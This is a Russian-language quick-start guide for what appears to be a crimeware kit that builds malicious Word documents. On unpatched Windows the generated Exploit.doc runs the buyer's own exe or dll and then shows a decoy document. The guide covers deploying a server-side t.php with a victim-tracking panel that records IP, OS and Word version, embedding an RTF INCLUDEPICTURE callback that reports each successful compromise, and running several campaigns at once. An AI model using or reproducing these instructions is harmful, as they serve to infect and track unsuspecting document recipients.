[Быстрый старт]:

1)Ставим Python 2.7 в дефолтную папку C:\Python27
2)Копируем папку с билдером в папку C:\Python27
3)Даем windows права на запись в папку с билдером и ее подпапки
4)В файле build_with_exe.bat в папке с билдером заменяем строку http://test1.ru/newbuild/t.php на свой путь
5)Запускаем build_with_exe.bat в результате в папке ready_exploit/web появляется файл t.php
6)Копируем файл t.php по тому пути что указали на шаге 4)
7)Выставляем на хосте права 777 на папку куда скопировали t.php
8)Открываем в браузере t.php?act=install
9)Тестируем Exploit.doc из папки ready_exploit - на непатченной Windows должен запуститься тестовый exe (блокнот) и тестовый документ для пользователя

В дальнейшем меняем в папке с билдером заменяем exe.exe на свой exe, decoy.doc на свой документ для пользователя, enable_editing.jpg на свою картинку и запускаем build_with_exe.bat
Серверную часть более трогать не надо.

P.S. Если в качестве доставляемого формата Вы используете dll вместо exe,
то вышеуказанные действия выполняем с файлом build_with_dll.bat вместо build_with_exe.bat

[Основные понятия]:

"документ для пользователя" - документ который будет показан пользователю после успешного пробива
"эксплойт-док" - собственно сам документ который пользователь будет открывать

[Использование веб-статистики]

t.php?stats=show
При переходе по данному линку будет отображена статистика по IP, Дате и времени открытия doc, ОС, версии Word и факте пробива (дорабатывается)
*Статистика не собирается в случае открытия doc в режиме Word Protected View

[Учет факта пробива]

Чтобы веб статистика учла факт пробива необходима отправка Вашим документом для пользователя запроса по адресу t.php?act=hit
Чаще всего это реализуется добавлением в документ картинки которая бы загружалась с выше указанного адреса.
Пример rtf кода который необходимо вставить в свой документ в формате RTF чтобы он стучался на сервер и сообщал о факте пробива:
{\field\v{\*\fldinst{INCLUDEPICTURE "http://test1.ru/newbuild/t.php?act=hit" MERGEFORMAT \\d \\w0001 \\h0001 \\pm1 \\px0 \\py0 \\pw0}}}

[Второй, третий и т.д. билды]:
При билдинге во второй, третий и т.д. разы нет необходимости перезаливать t.php на сервер.
Билдер самостоятельно связывается с t.php и передает ему необходимые параметры после каждого нового ребилда.

[Потоки]:
Если Вам необходимо использовать несколько разных .doc файлов для разных целей и разделять статистику по ним - добавьте в конец строки билдинга имя потока и Вы сможете
использовать несколько doc файлов с разными именами потоков одновременно и видеть информацию по каждому потоку в статистике t.php

Например: python.exe builder.py exe.exe decoy.doc enable_editing.png http://test1.ru/t.php thread1
